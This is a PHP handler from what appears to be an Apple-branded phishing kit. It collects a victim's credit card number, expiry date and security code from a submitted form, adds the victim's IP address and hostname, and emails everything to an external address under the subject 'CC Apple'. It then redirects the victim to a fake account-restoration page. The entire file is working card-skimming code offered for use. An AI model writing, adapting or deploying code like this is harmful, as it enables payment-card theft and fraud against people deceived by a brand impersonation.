<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "Card Number               : ".$_POST['cardNumber']."\n";
$bilsmg .= "|Expiration MM/YY -----: ".$_POST['expiration']."<br>\n";
$bilsmg .= "Security code              : ".$_POST['cvv']."\n";


$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "administrator@secure1client.com";
$bilsub = "CC Apple | From $ip";
$bilhead = "From:Duit Apple <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../restoreaccess-init.html";
header("location:$src");
?>
?>